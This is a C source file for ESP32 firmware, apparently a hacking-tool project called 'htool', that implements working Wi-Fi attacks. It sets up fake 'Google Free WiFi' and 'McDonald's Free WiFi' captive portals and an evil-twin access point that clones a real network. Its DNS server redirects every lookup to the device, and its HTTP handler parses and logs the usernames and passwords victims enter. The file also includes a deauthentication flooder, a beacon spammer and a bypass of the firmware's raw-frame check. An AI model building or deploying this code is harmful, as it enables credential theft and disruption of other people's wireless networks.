/*
Copyright (c) 2022 kl0ibi

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
 */
#include <string.h>
#include "htool_wifi.h"
#include "htool_display.h"
#include "htool_api.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_spi_flash.h"
#include "lwip/sockets.h"
#include "lwip/err.h"
#include "esp_netif.h"

#include "lwip/err.h"
#include "lwip/sockets.h"
#include "lwip/sys.h"
#include "lwip/netdb.h"

#include "esp_http_server.h"

#define TAG "htool_wifi"


extern const char html_google_start[] asm("_binary_google_html_start");
extern const char html_google_end[]   asm("_binary_google_html_end");
extern const char html_mcdonalds_start[] asm("_binary_mcdonalds_html_start");
extern const char html_mcdonalds_end[]   asm("_binary_mcdonalds_html_end");
extern const char html_router_start[] asm("_binary_router_html_start");
extern const char html_router_end[]   asm("_binary_router_html_end");


//TODO: DO BITALIGNMENT and BITSHIFTING

const int WIFI_SCAN_FINISHED_BIT = BIT0;
const int WIFI_CONNECTED = BIT1;

static TaskHandle_t htask;

htool_wifi_client_t *wifi_client = NULL;

wifi_ap_record_t *global_scans;

wifi_config_t *wifi_config = NULL;

uint16_t global_scans_num = 32;

uint8_t global_scans_count = 0;

uint8_t channel;

bool perform_active_scan = false;

bool perform_passive_scan = false;

bool scan_manually_stopped = false;

uint32_t sequence_number = 0;

wchar_t username1[22] = {0};
wchar_t username2[22] = {0};
wchar_t username3[22] = {0};
wchar_t username4[22] = {0};
wchar_t password[64] = {0};

captive_portal_task_args_t captive_portal_task_args;

#define DNS_PORT (53)
#define DNS_MAX_LEN (256)

#define OPCODE_MASK (0x7800)
#define QR_FLAG (1 << 7)
#define QD_TYPE_A (0x0001)
#define ANS_TTL_SEC (300)

extern int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { //redifned to override the check
    return 0;
}

// DNS Header Packet
typedef struct __attribute__((__packed__))
{
    uint16_t id;
    uint16_t flags;
    uint16_t qd_count;
    uint16_t an_count;
    uint16_t ns_count;
    uint16_t ar_count;
} dns_header_t;

// DNS Question Packet
typedef struct {
    uint16_t type;
    uint16_t class;
} dns_question_t;

// DNS Answer Packet
typedef struct __attribute__((__packed__))
{
    uint16_t ptr_offset;
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t addr_len;
    uint32_t ip_addr;
} dns_answer_t;

bool cp_running = false;
bool target_connected = false;

typedef struct sockaddr_in sockaddr_in_t;

httpd_handle_t server;
int sock = 0;

esp_err_t common_get_handler(httpd_req_t *req) {
    uint32_t len = 0;
    if (captive_portal_task_args.is_evil_twin) {
       len = html_router_end - html_router_start;
    }
    else {
       if (captive_portal_task_args.cp_index == 0) {
           len = html_google_end - html_google_start;
       }
       else if (captive_portal_task_args.cp_index == 1) {
           len = html_mcdonalds_end - html_mcdonalds_start;
       }
    }

    size_t req_hdr_host_len = httpd_req_get_hdr_value_len(req, "Host");
    char req_hdr_host_value[req_hdr_host_len + 1]; // + \0
    esp_err_t response_err;

    if ((response_err = httpd_req_get_hdr_value_str(req, "Host", (char*)&req_hdr_host_value, req_hdr_host_len + 1)) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to get header value for Host %d", response_err);
    }

    ESP_LOGI(TAG, "Host Header value: %s", req_hdr_host_value);
    if (strncmp(req_hdr_host_value, "connectivitycheck.gstatic.com", strlen("connectivitycheck.gstatic.com")) == 0) { // for android (google) devices to change the location name //-> for apple devices the captive.apple.com is default used and cant be changed 
        httpd_resp_set_status(req, "302 Found");
        if (!captive_portal_task_args.is_evil_twin) {
            if (captive_portal_task_args.cp_index == 0) {
                httpd_resp_set_hdr(req, "Location", "http://google.com");
            }
            else {
                httpd_resp_set_hdr(req, "Location", "http://mcdonalds.com");
            }
        }
        else {
            httpd_resp_set_hdr(req, "Location", "http://192.168.8.1");
        }
        httpd_resp_send(req, NULL, 0);
    }
    else {
        char *buf = NULL;
        size_t buf_len = 0;

        if ((buf_len = httpd_req_get_url_query_len(req) + 1) != 0) {
            if ((buf = malloc(buf_len)) == NULL) {
                ESP_LOGE(TAG, "No free mem exit...");
            }
            if (httpd_req_get_url_query_str(req, buf, buf_len) == ESP_OK) {
                ESP_LOGI(TAG, "Idiot gave credentials %s", buf);
                bool username_reached = false;

                uint8_t pw_index = 0;

                uint8_t offset = 5;
                for (uint8_t i = 0; i < strlen(buf); i++) {
                    if (!username_reached) {
                        if (buf[i+offset] == '%') {
                            if (i < 20) { //TODO: to this username splitting later at display cuz of performance
                                username1[i] = '@';
                            }
                            else if (i < 40) {
                                username2[i-20] = '@';
                            }
                            else if (i < 60) {
                                username3[i-40] = '@';
                            }
                            else if (i < 80) {
                                username4[i-60] = '@';
                            }
                            offset = offset + 2;
                            continue;
                        }
                        else if (buf[i+offset] != '&') {
                            if (i < 20) {
                                username1[i] = buf[i+offset];
                                username2[0] = 0;
                                username3[0] = 0;
                                username4[0] = 0;
                            }
                            else if (i < 40) {
                                username2[i-20] = buf[i+offset];
                            }
                            else if (i < 60) {
                                username3[i-40] = buf[i+offset];
                            }
                            else if (i < 80) {
                                username4[i-60] = buf[i+offset];
                            }
                        }
                        else {
                            username_reached = true;
                            offset = 12;
                            if (i < 20) {
                                username1[i] = '\0';
                            }
                            else if (i < 40) {
                                username2[i-20] = '\0';
                            }
                            else if (i < 60) {
                                username3[i-40] = '\0';
                            }
                            else if (i < 80) {
                                username4[i-60] = '\0';
                            }
                            pw_index = i+1;
                        }
                    }
                    else {
                        if (buf[i+offset] == '%') {
                            password[i-pw_index] = '@';
                            offset = offset + 2;
                        }
                        if (buf[i+offset] != '&') {
                            password[i-pw_index] = buf[i+offset];
                        }
                        else {
                            password[i-pw_index] = '\0';
                            break;
                        }
                    }
                }
            }
        }
        FREE_MEM(buf);
    }
    httpd_resp_set_type(req, "text/html");
    if (captive_portal_task_args.is_evil_twin) {
        httpd_resp_send(req, html_router_start, len);
    }
    else {
        if (captive_portal_task_args.cp_index == 0) {
            httpd_resp_send(req, html_google_start, len);
        }
        else if (captive_portal_task_args.cp_index == 1) {
            httpd_resp_send(req, html_mcdonalds_start, len);
        }
    }
    if (httpd_req_get_hdr_value_len(req, "Host") == 0) {
        ESP_LOGI(TAG, "Request Host header lost");
    }

    return 0;
}

httpd_uri_t embedded_html_uri = {
    .uri       = "/*",
    .method    = HTTP_GET,
    .handler   = common_get_handler,
};

int htool_wifi_start_httpd_server() {
    ESP_LOGI(TAG, "Starting HTTPD server");

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.uri_match_fn = httpd_uri_match_wildcard;
    config.max_open_sockets = 4; //TODO: maybe adapt everywhere
    config.lru_purge_enable = true;

    if ((httpd_start(&server, &config) != ESP_OK)) {
        ESP_LOGE(TAG, "Failed to start HTTPD server");
        goto exit;
    }
    httpd_register_uri_handler(server, &embedded_html_uri);
    ESP_LOGI(TAG, "HTTPD registered URI handlers");

    return HTOOL_OK;
    exit:
    return HTOOL_ERR_GENERAL;
}

void httpd_server_task() {
    htool_wifi_start_httpd_server();
    while (cp_running) {
        while (cp_running && !target_connected && captive_portal_task_args.is_evil_twin) {
            htool_wifi_send_deauth_frame(captive_portal_task_args.ssid_index, false);
            htool_wifi_send_disassociate_frame(captive_portal_task_args.ssid_index, false);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    vTaskDelete(NULL);
}

static char *parse_dns_name(char *raw_name, char *parsed_name, size_t parsed_name_max_len) {
    char *label = raw_name;
    char *name_itr = parsed_name;
    int name_len = 0;

    do {
        int sub_name_len = *label;
        name_len += (sub_name_len + 1);
        if (name_len > parsed_name_max_len) {
            return NULL;
        }
        memcpy(name_itr, label + 1, sub_name_len);
        name_itr[sub_name_len] = '.';
        name_itr += (sub_name_len + 1);
        label += sub_name_len + 1;
    } while (*label != 0);
    parsed_name[name_len - 1] = '\0';

    return label + 1;
}

static int parse_dns_request(char *req, size_t req_len, char *dns_reply, size_t dns_reply_max_len) {
    if (req_len > dns_reply_max_len) {
        return -1;
    }
    memset(dns_reply, 0, dns_reply_max_len);
    memcpy(dns_reply, req, req_len);

    dns_header_t *header = (dns_header_t *)dns_reply;
    ESP_LOGD(TAG, "DNS query with header id: 0x%X, flags: 0x%X, qd_count: %d",
             ntohs(header->id), ntohs(header->flags), ntohs(header->qd_count));

    if ((header->flags & OPCODE_MASK) != 0) {
        return 0;
    }
    header->flags |= QR_FLAG;

    uint16_t qd_count = ntohs(header->qd_count);
    header->an_count = htons(qd_count);

    int reply_len = qd_count * sizeof(dns_answer_t) + req_len;
    if (reply_len > dns_reply_max_len) {
        return -1;
    }

    char *cur_ans_ptr = dns_reply + req_len;
    char *cur_qd_ptr = dns_reply + sizeof(dns_header_t);
    char name[128];

    for (int i = 0; i < qd_count; i++) {
        char *name_end_ptr = parse_dns_name(cur_qd_ptr, name, sizeof(name));
        if (name_end_ptr == NULL) {
            ESP_LOGE(TAG, "Failed to parse DNS question: %s", cur_qd_ptr);
            return -1;
        }

        dns_question_t *question = (dns_question_t *)(name_end_ptr);
        uint16_t qd_type = ntohs(question->type);
        uint16_t qd_class = ntohs(question->class);

        ESP_LOGD(TAG, "Received type: %d | Class: %d | Question for: %s", qd_type, qd_class, name);

        if (qd_type == QD_TYPE_A) {
            dns_answer_t *answer = (dns_answer_t *)cur_ans_ptr;

            answer->ptr_offset = htons(0xC000 | (cur_qd_ptr - dns_reply));
            answer->type = htons(qd_type);
            answer->class = htons(qd_class);
            answer->ttl = htonl(ANS_TTL_SEC);

            esp_netif_ip_info_t ip_info;
            esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_AP_DEF"), &ip_info);
            ESP_LOGD(TAG, "Answer with PTR offset: 0x%" PRIX16 " and IP 0x%" PRIX32, ntohs(answer->ptr_offset), ip_info.ip.addr);

            answer->addr_len = htons(sizeof(ip_info.ip.addr));
            answer->ip_addr = ip_info.ip.addr;
        }
    }
    return reply_len;
}

void dns_server_task(void *pvParameters) {
    char rx_buffer[128];
    char addr_str[128];
    int addr_family;
    int ip_protocol;

    while (cp_running) {
        sockaddr_in_t dest_addr;
        dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(DNS_PORT);
        addr_family = AF_INET;
        ip_protocol = IPPROTO_IP;
        inet_ntoa_r(dest_addr.sin_addr, addr_str, sizeof(addr_str) - 1);

        sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
        if (sock < 0) {
            ESP_LOGE(TAG, "Unable to create socket: errno %d", errno);
            break;
        }
        ESP_LOGI(TAG, "Socket created");

        int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (err < 0) {
            ESP_LOGE(TAG, "Socket unable to bind: errno %d", errno);
        }
        ESP_LOGI(TAG, "Socket bound, port %d", DNS_PORT);

        while (cp_running) {
            struct sockaddr_in6 source_addr; // Large enough for both IPv4 or IPv6
            socklen_t socklen = sizeof(source_addr);
            int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0, (struct sockaddr *)&source_addr, &socklen);

            // Error occurred during receiving
            if (len < 0) {
                ESP_LOGE(TAG, "recvfrom failed: errno %d", errno);
                if (cp_running == false) {
                    goto exit;
                }
                close(sock);
                break;
            }
            else {
                // Get the sender's ip address as string
                if (source_addr.sin6_family == PF_INET) {
                    inet_ntoa_r(((sockaddr_in_t *)&source_addr)->sin_addr.s_addr, addr_str, sizeof(addr_str) - 1);
                }
                else if (source_addr.sin6_family == PF_INET6) {
                    inet6_ntoa_r(source_addr.sin6_addr, addr_str, sizeof(addr_str) - 1);
                }

                rx_buffer[len] = 0;

                char reply[DNS_MAX_LEN];
                int reply_len = parse_dns_request(rx_buffer, len, reply, DNS_MAX_LEN);

                ESP_LOGI(TAG, "Received %d bytes from %s | DNS reply with len: %d", len, addr_str, reply_len);
                if (reply_len <= 0) {
                    ESP_LOGE(TAG, "Failed to prepare a DNS reply");
                }
                else {
                    int err = sendto(sock, reply, reply_len, 0, (struct sockaddr *)&source_addr, sizeof(source_addr));
                    if (err < 0) {
                        ESP_LOGE(TAG, "Error occurred during sending: errno %d", errno);
                        break;
                    }
                }
            }
        }
    }
    exit:
    shutdown(sock, 0);
    close(sock);
    vTaskDelete(NULL);
}

void htool_wifi_dns_start() {
    ESP_LOGI(TAG, "Starting DNS server ...");
    xTaskCreatePinnedToCore(dns_server_task, "dns_task", 4096, NULL, 5, NULL, 0);
}

void htool_wifi_start_httpd_server_task() {
    ESP_LOGI(TAG, "Starting HTTP server ...");
    xTaskCreatePinnedToCore(httpd_server_task, "http_server", 4096, NULL, 5, NULL, 0);
}

void wifi_event_handler(void* arg, esp_event_base_t event_base,
                        int32_t event_id, void* event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) {
        target_connected = true;
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        target_connected = false;
    }
}

void htool_wifi_captive_portal_start(void *pvParameters) {
    esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL);
    esp_wifi_stop();
    wifi_config_t wifi_config = {0};
    if (captive_portal_task_args.is_evil_twin) {
        ESP_LOGD(TAG, "Starting evil twin ...");
        memcpy(wifi_config.ap.ssid, global_scans[captive_portal_task_args.ssid_index].ssid, sizeof(global_scans[captive_portal_task_args.ssid_index].ssid));
        wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
        wifi_config.ap.channel = global_scans[captive_portal_task_args.ssid_index].primary;
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
        wifi_config.ap.max_connection = 4;
        esp_base_mac_addr_set(global_scans[captive_portal_task_args.ssid_index].bssid);
    }
    else {
        if (captive_portal_task_args.cp_index == 0) {
            ESP_LOGI(TAG, "Starting google captive portal ...");
            strcpy((char *)wifi_config.ap.ssid, "Google Free WiFi Test");
            wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
            wifi_config.ap.channel = 0;
            wifi_config.ap.authmode = WIFI_AUTH_OPEN;
            wifi_config.ap.max_connection = 4;
        }
        else {
            ESP_LOGI(TAG, "Starting mcdonnalds captive portal ...");
            strcpy((char *)wifi_config.ap.ssid, "McDonald's Free WiFi");
            wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
            wifi_config.ap.channel = 0;
            wifi_config.ap.authmode = WIFI_AUTH_OPEN;
            wifi_config.ap.max_connection = 4;
        }
   }
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &wifi_config));
    target_connected = false;
    cp_running = true;
    esp_wifi_start();
    htool_wifi_dns_start();
    htool_wifi_start_httpd_server_task();
}

void htool_wifi_captive_portal_stop(void *pvParameters) {
    httpd_unregister_uri_handler(server, "/*", 1);
    httpd_stop(server);
    cp_running = false; //closes the dns server
    shutdown(sock, 0);
    close(sock);
    target_connected = false;
    htool_set_wifi_sta_config(); //change back to sta mode to make sure we can perform scans again
}

// barebones packet
uint8_t beacon_packet[56] = { 0x80, 0x00, 0x00, 0x00, //Frame Control, Duration
        /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination address
        /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //Source address - overwritten later
        /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - overwritten to the same as the source address
        /*22*/  0xc0, 0x6c, //Seq-ctl
        /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //timestamp - the number of microseconds the AP has been active
        /*32*/  0x64, 0x00, //Beacon interval
        /*34*/  0x01, 0x04, //Capability info
        /* SSID */
        /*36*/  0x00
};

static uint8_t deauth_packet[26] = {
        0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff,0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x02, 0x00
};

char beacon_random[] = "1234567890qwertzuiopasdfghjklyxcvbnm QWERTZUIOPASDFGHJKLYXCVBNM_";

void send_random_beacon_frame() { //TODO: maybe add some predefined beacon frames to make it looks more funny
    channel = esp_random() % 13 + 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Randomize SRC MAC
    beacon_packet[10] = beacon_packet[16] = esp_random() % 256;
    beacon_packet[11] = beacon_packet[17] = esp_random() % 256;
    beacon_packet[12] = beacon_packet[18] = esp_random() % 256;
    beacon_packet[13] = beacon_packet[19] = esp_random() % 256;
    beacon_packet[14] = beacon_packet[20] = esp_random() % 256;
    beacon_packet[15] = beacon_packet[21] = esp_random() % 256;
    beacon_packet[37] = 6;

    // Randomize SSID (Fixed size 6. Lazy right?)
    beacon_packet[38] = beacon_random[esp_random() % 65];
    beacon_packet[39] = beacon_random[esp_random() % 65];
    beacon_packet[40] = beacon_random[esp_random() % 65];
    beacon_packet[41] = beacon_random[esp_random() % 65];
    beacon_packet[42] = beacon_random[esp_random() % 65];
    beacon_packet[43] = beacon_random[esp_random() % 65];

    beacon_packet[56] = channel;

    uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                            0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };


    for (uint8_t i = 0; i < 12; i++)
        beacon_packet[38 + 6 + i] = postSSID[i];

    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), false);
}


void beacon_spammer() {
    while (htool_api_is_beacon_spammer_running()) {
        send_random_beacon_frame();
        ESP_LOGI(TAG, "Beacon sent");
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    ESP_LOGI(TAG, "Beacon Spammer Task stopped");
    vTaskDelete(NULL);
}

void htool_wifi_start_beacon_spammer() {
    if (perform_passive_scan || perform_active_scan) {
        ESP_LOGI(TAG, "Scan in progress, stop the scan");
        scan_manually_stopped = true;
        esp_wifi_scan_stop();
    }
    xTaskCreatePinnedToCore(beacon_spammer, "beacon_spammer", 4096, NULL, 1, NULL, 0);
}

void htool_wifi_send_disassociate_frame(uint8_t num, bool sta) {
    if (esp_wifi_set_channel(global_scans[num].primary, global_scans[num].second) != ESP_OK) {
        ESP_LOGI(TAG, "TARGET is connectiong");
        target_connected = true;
    }

    deauth_packet[10] = deauth_packet[16] = global_scans[num].bssid[0];
    deauth_packet[11] = deauth_packet[17] = global_scans[num].bssid[1];
    deauth_packet[12] = deauth_packet[18] = global_scans[num].bssid[2];
    deauth_packet[13] = deauth_packet[19] = global_scans[num].bssid[3];
    deauth_packet[14] = deauth_packet[20] = global_scans[num].bssid[4];
    deauth_packet[15] = deauth_packet[21] = global_scans[num].bssid[5];

    deauth_packet[4] = esp_random() % 256;
    deauth_packet[5] = esp_random() % 256;
    deauth_packet[6] = esp_random() % 256;
    deauth_packet[7] = esp_random() % 256;
    deauth_packet[8] = esp_random() % 256;
    deauth_packet[9] = esp_random() % 256;

    deauth_packet[0] = 0xA0; // Deauth

    if (!sta) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        ESP_LOGI(TAG, "Disassociate frame sent: %s %d %d %d", global_scans[num].ssid, global_scans[num].primary,
                 global_scans[num].second, num);
    }
    else {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        ESP_LOGI(TAG, "Disassociate frame sent: %s %d %d %d", global_scans[num].ssid, global_scans[num].primary,
                 global_scans[num].second, num);

    }
}

void htool_wifi_send_deauth_frame(uint8_t num, bool sta) {
    if (esp_wifi_set_channel(global_scans[num].primary, global_scans[num].second) != ESP_OK) {
        ESP_LOGI(TAG, "TARGET is connectiong");
        target_connected = true;
    }

    deauth_packet[10] = deauth_packet[16] = global_scans[num].bssid[0];
    deauth_packet[11] = deauth_packet[17] = global_scans[num].bssid[1];
    deauth_packet[12] = deauth_packet[18] = global_scans[num].bssid[2];
    deauth_packet[13] = deauth_packet[19] = global_scans[num].bssid[3];
    deauth_packet[14] = deauth_packet[20] = global_scans[num].bssid[4];
    deauth_packet[15] = deauth_packet[21] = global_scans[num].bssid[5];

    deauth_packet[4] = esp_random() % 256;
    deauth_packet[5] = esp_random() % 256;
    deauth_packet[6] = esp_random() % 256;
    deauth_packet[7] = esp_random() % 256;
    deauth_packet[8] = esp_random() % 256;
    deauth_packet[9] = esp_random() % 256;

    deauth_packet[0] = 0xC0; // Deauth

    if (!sta) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        ESP_LOGI(TAG, "Deauth sent: %s %d %d %d", global_scans[num].ssid, global_scans[num].primary, global_scans[num].second, num);
    }
    else {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        ESP_LOGI(TAG, "Deauth sent: %s %d %d %d", global_scans[num].ssid, global_scans[num].primary, global_scans[num].second, num);
    }
}

void htool_send_deauth_all() {
    for (uint8_t i = 0; i < global_scans_count; i++) {
        htool_wifi_send_deauth_frame(i, true);
    }
}

void deauther_task() {
    while (htool_api_is_deauther_running()) {
        if (menu_cnt != global_scans_count) {
            htool_wifi_send_deauth_frame(menu_cnt, true);
        }
        else {
            htool_send_deauth_all();
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    ESP_LOGI(TAG, "Deauther Task stopped");
    vTaskDelete(NULL);
}

void htool_wifi_start_deauth() {
    if (perform_passive_scan || perform_active_scan) {
        ESP_LOGI(TAG, "Scan in progress, stop the scan");
        scan_manually_stopped = true;
        esp_wifi_scan_stop();
    }
    xTaskCreatePinnedToCore(deauther_task, "deauth", 4096, NULL, 1, NULL, 0);
}

void htool_wifi_start_active_scan() {
    perform_active_scan = true;
}

void htool_wifi_start_passive_scan() {
    perform_passive_scan = true;
}

static void wifi_handling_task(void *pvParameters) {
    wifi_scan_config_t scan_conf;
    EventBits_t uxBits;
    if ((global_scans = calloc(32, sizeof(wifi_ap_record_t))) == NULL) {
        ESP_LOGE(TAG, "Error no more free Memory");
        vTaskDelete(NULL);
    }
    if ((wifi_config = calloc(1, sizeof(wifi_config_t))) == NULL) {
        ESP_LOGE(TAG, "Error no more free Memory");
        vTaskDelete(NULL);
    }
    while (true) {
        while (perform_active_scan) {
            scan_conf.scan_type = WIFI_SCAN_TYPE_ACTIVE;
            scan_conf.show_hidden = true;
            scan_conf.scan_time.active.min = 50;
            scan_conf.scan_time.active.max = 100;
            if (esp_wifi_scan_start(&scan_conf, false) != ESP_OK) {
                ESP_LOGE(TAG, "Error at wifi_scan_start probably not in station mode change to station mode");
                htool_set_wifi_sta_config();
            }
            xEventGroupClearBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT);
            uxBits = xEventGroupWaitBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT, pdTRUE, pdFALSE,
                                         pdMS_TO_TICKS(1500));
            if ((uxBits & WIFI_SCAN_FINISHED_BIT) != 0) {
                ESP_LOGI(TAG, "Scan finished");
                if (scan_manually_stopped) {
                    scan_manually_stopped = false;
                    perform_active_scan = false;
                    scan_started = false;
                    ESP_LOGI(TAG, "Scan manually stopped");
                    break;
                }
                esp_wifi_scan_get_ap_records(&global_scans_num, global_scans);
                global_scans_count = global_scans_num;
                global_scans_num = 32;
                ESP_LOGI(TAG, "Scan count: %d", global_scans_count);
                perform_active_scan = false;
                scan_started = false;
            }
            else {
                perform_active_scan = false;
                ESP_LOGE(TAG, "Scan timeout");
            }
        }
        while (perform_passive_scan) {
            scan_conf.scan_type = WIFI_SCAN_TYPE_PASSIVE;
            scan_conf.show_hidden = true;
            scan_conf.scan_time.passive = 520;
            if (esp_wifi_scan_start(&scan_conf, false) != ESP_OK) {
                ESP_LOGE(TAG, "Error at wifi_scan_start probably not in station mode change to station mode");
                htool_set_wifi_sta_config();
            }
            xEventGroupClearBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT);
            uxBits = xEventGroupWaitBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT, pdTRUE, pdFALSE,
                                         pdMS_TO_TICKS(8000));
            if ((uxBits & WIFI_SCAN_FINISHED_BIT) != 0) {
                ESP_LOGI(TAG, "Scan finished");
                if (scan_manually_stopped) {
                    scan_manually_stopped = false;
                    perform_passive_scan = false;
                    scan_started = false;
                    ESP_LOGI(TAG, "Scan manually stopped");
                    break;
                }
                esp_wifi_scan_get_ap_records(&global_scans_num, global_scans);
                global_scans_count = global_scans_num;
                global_scans_num = 32;
                ESP_LOGI(TAG, "Scan count: %d", global_scans_count);
                perform_passive_scan = false;
                scan_started = false;
            }
            else {
                perform_passive_scan = false;
                ESP_LOGE(TAG, "Scan timeout");
            }
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        ESP_LOGI(TAG, "WIFI_EVENT_STA_START");
        wifi_client->wifi_station_active = true;
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_STOP) {
        ESP_LOGI(TAG, "WIFI_EVENT_STA_STOP");
        wifi_client->wifi_station_active = false;
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_SCAN_DONE) {
        ESP_LOGI(TAG, "WIFI_EVENT_SCAN_DONE");
        xEventGroupSetBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT);
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        ESP_LOGI(TAG, "WIFI_EVENT_STA_DISCONNECTED");
        wifi_event_sta_disconnected_t *dr = event_data;
        wifi_err_reason_t reason = dr->reason;
        ESP_LOGW(TAG, "Disconnected. Reason: %d", reason);
        if (reason != WIFI_REASON_ASSOC_LEAVE) {
            wifi_client->wifi_connected = false;
        }
    }
    else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
        ESP_LOGI(TAG, "WIFI_EVENT_STA_CONNECTED");
        wifi_client->wifi_connected = true;
        xEventGroupSetBits(wifi_client->status_bits, WIFI_CONNECTED);
    }
    else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ESP_LOGI(TAG, "IP_EVENT_STA_GOT_IP");
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
        ESP_LOGI(TAG, "got ip:%s", ip4addr_ntoa((const ip4_addr_t *)&event->ip_info.ip));
    }
}

void htool_set_wifi_sta_config() {
    esp_wifi_stop();
    wifi_config_t config = {0};
    config.sta.scan_method = WIFI_ALL_CHANNEL_SCAN;
    config.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_config(ESP_IF_WIFI_STA, &config);
    esp_wifi_start();
}


void htool_wifi_start() {
    if (esp_wifi_start() != ESP_OK) {
		ESP_LOGE(TAG, "Error during esp_wifi_start()!");
		esp_restart();
	}
   xTaskCreatePinnedToCore(wifi_handling_task, "wifi_handling_task", 4096,
                          NULL, 6, &htask, PRO_CPU_NUM);
}

int htool_wifi_init() {
    wifi_client = calloc(1, sizeof(htool_wifi_client_t));
    if (wifi_client == NULL) {
        ESP_LOGE(TAG, "Error no Memory");
        return HTOOL_ERR_MEMORY;
    }
    wifi_client->status_bits = xEventGroupCreate();
    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        err = nvs_flash_init();
    }
